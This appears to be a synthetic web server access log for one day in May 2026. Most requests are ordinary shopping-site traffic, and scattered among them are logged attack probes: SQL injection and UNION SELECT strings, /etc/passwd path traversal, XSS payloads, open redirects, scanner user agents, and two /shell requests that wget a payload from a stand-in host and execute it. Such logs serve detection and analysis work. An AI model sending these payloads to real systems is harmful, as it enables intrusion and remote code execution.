203.0.113.11 - - [21/May/2026:09:29:07 +0000] "GET /api/v1/status HTTP/1.1" 200 6422 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.12 - - [21/May/2026:20:15:29 +0000] "GET /products/12 HTTP/1.1" 200 5040 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.12 - - [21/May/2026:10:34:26 +0000] "GET /products/12 HTTP/1.1" 200 1022 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.21 - - [21/May/2026:15:06:44 +0000] "GET /search?q=phone HTTP/1.1" 200 1880 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
198.51.100.79 - - [21/May/2026:13:43:31 +0000] "POST /api/v1/user?id=1%27%2bOR%2b%271%27%3d%271 HTTP/1.1" 403 611 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.11 - - [21/May/2026:09:45:12 +0000] "GET /products/43 HTTP/1.1" 200 4807 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.21 - - [21/May/2026:14:54:38 +0000] "GET / HTTP/1.1" 200 532 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.11 - - [21/May/2026:11:54:33 +0000] "GET /products/12 HTTP/1.1" 404 480 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.22 - - [21/May/2026:12:07:37 +0000] "GET /cart HTTP/1.1" 200 4465 "https://yandex.ru/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.12 - - [21/May/2026:12:02:30 +0000] "GET /static/js/app.js HTTP/1.1" 200 7837 "https://yandex.ru/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.10 - - [21/May/2026:15:46:37 +0000] "GET /contact HTTP/1.1" 200 2959 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
185.220.101.45 - - [21/May/2026:11:37:04 +0000] "GET /admin/login HTTP/1.1" 404 1161 "-" "sqlmap/1.8.3#stable (https://sqlmap.org)"
192.168.1.13 - - [21/May/2026:11:12:09 +0000] "GET /contact HTTP/1.1" 200 4139 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.24 - - [21/May/2026:18:39:53 +0000] "GET /products HTTP/1.1" 200 4211 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.24 - - [21/May/2026:16:38:50 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 302 269 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.44 - - [21/May/2026:11:16:56 +0000] "GET /api/v1/user?id=1%27%2bOR%2b%271%27%3d%271 HTTP/1.1" 403 773 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.22 - - [21/May/2026:17:32:14 +0000] "GET /about HTTP/1.1" 200 8632 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.77 - - [21/May/2026:19:21:59 +0000] "GET /backup.zip HTTP/1.1" 404 443 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.23 - - [21/May/2026:19:55:32 +0000] "GET /contact HTTP/1.1" 200 5955 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
198.51.100.78 - - [21/May/2026:11:51:01 +0000] "GET /.env HTTP/1.1" 403 325 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.79 - - [21/May/2026:14:45:18 +0000] "GET /search?q=%27%20OR%20%271%27%3D%271 HTTP/1.1" 403 833 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.12 - - [21/May/2026:18:02:24 +0000] "GET /products/12 HTTP/1.1" 200 710 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
185.220.101.45 - - [21/May/2026:16:17:28 +0000] "GET /search?q=%22%20OR%20%221%22%3D%221 HTTP/1.1" 403 88 "-" "Nmap Scripting Engine; https://nmap.org/book/nse.html"
192.168.1.11 - - [21/May/2026:13:54:57 +0000] "GET /search?q=phone HTTP/1.1" 200 8293 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.11 - - [21/May/2026:19:52:08 +0000] "GET /about HTTP/1.1" 200 2227 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.24 - - [21/May/2026:09:14:54 +0000] "GET /static/js/app.js HTTP/1.1" 200 904 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.10 - - [21/May/2026:19:41:33 +0000] "GET /static/js/app.js HTTP/1.1" 200 3118 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.10 - - [21/May/2026:15:27:41 +0000] "GET /api/v1/status HTTP/1.1" 200 3507 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.12 - - [21/May/2026:19:50:17 +0000] "GET / HTTP/1.1" 200 2274 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.23 - - [21/May/2026:13:39:46 +0000] "GET /search?q=laptop HTTP/1.1" 200 1509 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.77 - - [21/May/2026:12:52:14 +0000] "GET /.env HTTP/1.1" 200 4959 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.21 - - [21/May/2026:20:15:59 +0000] "GET /static/img/logo.png HTTP/1.1" 200 2900 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.24 - - [21/May/2026:11:05:49 +0000] "GET /static/img/logo.png HTTP/1.1" 200 4144 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.22 - - [21/May/2026:11:53:56 +0000] "GET /about HTTP/1.1" 200 7567 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.45 - - [21/May/2026:08:42:51 +0000] "GET /search?q=test%22%20AND%20%28SELECT%201%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29-- HTTP/1.1" 403 348 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.11 - - [21/May/2026:16:46:52 +0000] "GET /contact HTTP/1.1" 200 4165 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.22 - - [21/May/2026:14:31:29 +0000] "GET /static/js/app.js HTTP/1.1" 200 5482 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
172.16.0.46 - - [21/May/2026:10:56:54 +0000] "GET /comment?text=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 404 191 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.12 - - [21/May/2026:15:58:41 +0000] "GET /static/css/style.css HTTP/1.1" 200 2425 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.45 - - [21/May/2026:12:17:21 +0000] "POST /shell?cd%2B/tmp%3Bwget%2Bhttp%3A//malicious.example/bin%3Bchmod%2B777%2Bbin%3B./bin HTTP/1.1" 500 178 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.46 - - [21/May/2026:08:05:20 +0000] "GET /index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1" 200 4478 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.12 - - [21/May/2026:17:43:13 +0000] "GET /products/12 HTTP/1.1" 200 2583 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
198.51.100.77 - - [21/May/2026:17:26:10 +0000] "GET /phpmyadmin HTTP/1.1" 404 1179 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.13 - - [21/May/2026:15:29:12 +0000] "GET /static/img/logo.png HTTP/1.1" 200 2752 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.11 - - [21/May/2026:08:22:12 +0000] "GET /static/js/app.js HTTP/1.1" 200 702 "https://yandex.ru/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.24 - - [21/May/2026:12:51:34 +0000] "GET /api/v1/status HTTP/1.1" 200 6893 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.13 - - [21/May/2026:20:06:49 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 8768 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.23 - - [21/May/2026:09:03:49 +0000] "GET /static/css/style.css HTTP/1.1" 200 6445 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.22 - - [21/May/2026:08:27:23 +0000] "GET /api/v1/status HTTP/1.1" 302 363 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.11 - - [21/May/2026:18:42:39 +0000] "GET /api/v1/user/profile HTTP/1.1" 200 6157 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.24 - - [21/May/2026:09:07:15 +0000] "GET /cart HTTP/1.1" 200 6918 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.22 - - [21/May/2026:17:18:44 +0000] "GET /static/js/app.js HTTP/1.1" 200 2023 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.155.205.33 - - [21/May/2026:10:36:34 +0000] "GET /redirect?url=http%3A%2F%2Fevil.example%2Fphish HTTP/1.1" 302 438 "-" "WPScan v3.8.25"
203.0.113.11 - - [21/May/2026:15:38:35 +0000] "GET /about HTTP/1.1" 200 7848 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.45 - - [21/May/2026:08:30:31 +0000] "GET /product?id=1/**/UNION/**/SELECT/**/user,password/**/FROM/**/users HTTP/1.1" 404 582 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.11 - - [21/May/2026:10:59:19 +0000] "GET /cart HTTP/1.1" 200 5492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.45 - - [21/May/2026:16:32:07 +0000] "GET /shell?cmd=%77%67%65%74%20http%3A%2F%2Fevil.example%2Fx%20-O%20%2Ftmp%2Fx HTTP/1.1" 200 5696 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.10 - - [21/May/2026:11:25:28 +0000] "GET / HTTP/1.1" 200 6768 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.12 - - [21/May/2026:08:38:36 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 1763 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
198.51.100.78 - - [21/May/2026:14:08:01 +0000] "GET /wp-content/plugins/ HTTP/1.1" 200 3584 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.24 - - [21/May/2026:14:39:02 +0000] "GET /static/css/style.css HTTP/1.1" 200 1470 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.11 - - [21/May/2026:19:30:43 +0000] "GET /contact HTTP/1.1" 200 7394 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.10 - - [21/May/2026:09:24:15 +0000] "GET /products/12 HTTP/1.1" 200 2384 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.10 - - [21/May/2026:19:25:14 +0000] "GET /contact HTTP/1.1" 200 2093 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.155.205.33 - - [21/May/2026:16:39:27 +0000] "GET /config.php HTTP/1.1" 403 428 "-" "Skipfish/2.10b"
10.0.0.21 - - [21/May/2026:17:09:56 +0000] "GET /checkout HTTP/1.1" 200 2489 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
172.16.0.46 - - [21/May/2026:14:26:48 +0000] "GET /product?id=1%20UNION%20SELECT%201,2,3-- HTTP/1.1" 403 839 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.12 - - [21/May/2026:16:49:40 +0000] "GET /products HTTP/1.1" 200 894 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.77 - - [21/May/2026:08:14:31 +0000] "GET /wp-admin/ HTTP/1.1" 200 1606 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
172.16.0.46 - - [21/May/2026:08:48:44 +0000] "GET /index.php?page=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 403 794 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
198.51.100.78 - - [21/May/2026:12:52:08 +0000] "POST /phpmyadmin HTTP/1.1" 403 347 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.78 - - [21/May/2026:18:04:10 +0000] "POST /login HTTP/1.1" 403 250 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.13 - - [21/May/2026:08:26:50 +0000] "GET /products HTTP/1.1" 200 6901 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
91.240.118.172 - - [21/May/2026:20:04:38 +0000] "GET /comment?text=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 404 868 "-" "Skipfish/2.10b"
192.168.1.10 - - [21/May/2026:12:25:01 +0000] "POST /api/v1/user/profile HTTP/1.1" 200 2159 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.11 - - [21/May/2026:16:57:17 +0000] "GET /products/12 HTTP/1.1" 200 4842 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.10 - - [21/May/2026:19:43:17 +0000] "GET /search?q=laptop HTTP/1.1" 200 7027 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.10 - - [21/May/2026:09:48:54 +0000] "GET /static/img/logo.png HTTP/1.1" 200 3430 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
172.16.0.45 - - [21/May/2026:13:47:43 +0000] "GET /comment?text=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 403 1184 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
185.220.101.45 - - [21/May/2026:18:58:14 +0000] "GET /redirect?url=http%3A%2F%2Fevil.example%2Fphish HTTP/1.1" 404 678 "-" "Nikto/2.5.0"
203.0.113.10 - - [21/May/2026:10:10:25 +0000] "GET /contact HTTP/1.1" 200 1683 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.24 - - [21/May/2026:08:03:56 +0000] "GET /about HTTP/1.1" 200 3685 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.10 - - [21/May/2026:17:58:18 +0000] "GET /static/css/style.css HTTP/1.1" 200 5218 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.79 - - [21/May/2026:14:13:03 +0000] "POST /phpmyadmin HTTP/1.1" 200 3435 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
172.16.0.45 - - [21/May/2026:18:09:45 +0000] "GET /product?id=1/**/UNION/**/SELECT/**/user,password/**/FROM/**/users HTTP/1.1" 403 885 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.11 - - [21/May/2026:16:40:33 +0000] "GET / HTTP/1.1" 200 7172 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.12 - - [21/May/2026:19:37:39 +0000] "GET /index.html HTTP/1.1" 200 2331 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.22 - - [21/May/2026:11:09:40 +0000] "GET /contact HTTP/1.1" 200 7359 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.79 - - [21/May/2026:10:34:00 +0000] "GET /admin HTTP/1.1" 302 780 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.11 - - [21/May/2026:11:48:33 +0000] "GET /static/js/app.js HTTP/1.1" 200 4885 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.12 - - [21/May/2026:20:03:52 +0000] "GET /static/css/style.css HTTP/1.1" 200 5721 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.12 - - [21/May/2026:14:09:40 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 4131 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
185.220.101.45 - - [21/May/2026:17:13:06 +0000] "GET /.env HTTP/1.1" 403 350 "-" "WPScan v3.8.25"
10.0.0.21 - - [21/May/2026:11:32:48 +0000] "GET /products/12 HTTP/1.1" 200 8373 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.22 - - [21/May/2026:10:31:40 +0000] "GET /products/43 HTTP/1.1" 200 3342 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.11 - - [21/May/2026:10:43:44 +0000] "GET /api/v1/status HTTP/1.1" 302 626 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.10 - - [21/May/2026:09:25:36 +0000] "GET /checkout HTTP/1.1" 200 4899 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.12 - - [21/May/2026:19:18:08 +0000] "GET /static/js/app.js HTTP/1.1" 200 6352 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.11 - - [21/May/2026:18:47:29 +0000] "GET /search?q=phone HTTP/1.1" 200 8957 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.155.205.33 - - [21/May/2026:14:19:27 +0000] "HEAD /wp-login.php HTTP/1.1" 404 951 "-" "sqlmap/1.8.3#stable (https://sqlmap.org)"
198.51.100.77 - - [21/May/2026:17:48:52 +0000] "GET /phpMyAdmin HTTP/1.1" 302 477 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
172.16.0.46 - - [21/May/2026:12:27:31 +0000] "POST /index.php?page=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.46 - - [21/May/2026:20:19:09 +0000] "GET /product?id=1/**/UNION/**/SELECT/**/user,password/**/FROM/**/users HTTP/1.1" 403 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.10 - - [21/May/2026:16:52:34 +0000] "GET /index.html HTTP/1.1" 200 5624 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.11 - - [21/May/2026:11:03:17 +0000] "GET /search?q=phone HTTP/1.1" 200 4233 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.12 - - [21/May/2026:17:08:34 +0000] "GET /products HTTP/1.1" 200 8539 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
198.51.100.79 - - [21/May/2026:11:32:58 +0000] "GET /xmlrpc.php HTTP/1.1" 200 7387 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.10 - - [21/May/2026:12:27:06 +0000] "GET /checkout HTTP/1.1" 200 8167 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.12 - - [21/May/2026:14:58:35 +0000] "GET /about HTTP/1.1" 200 8372 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.13 - - [21/May/2026:15:24:28 +0000] "GET /checkout HTTP/1.1" 200 6440 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
45.155.205.33 - - [21/May/2026:16:41:33 +0000] "GET /config.php HTTP/1.1" 403 255 "-" "Nikto/2.5.0"
203.0.113.10 - - [21/May/2026:16:09:40 +0000] "GET /static/img/logo.png HTTP/1.1" 200 6779 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.12 - - [21/May/2026:14:02:13 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 4054 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
45.155.205.33 - - [21/May/2026:17:42:15 +0000] "HEAD /phpmyadmin HTTP/1.1" 404 910 "-" "Nmap Scripting Engine; https://nmap.org/book/nse.html"
192.168.1.10 - - [21/May/2026:18:23:55 +0000] "GET /products/43 HTTP/1.1" 200 8771 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
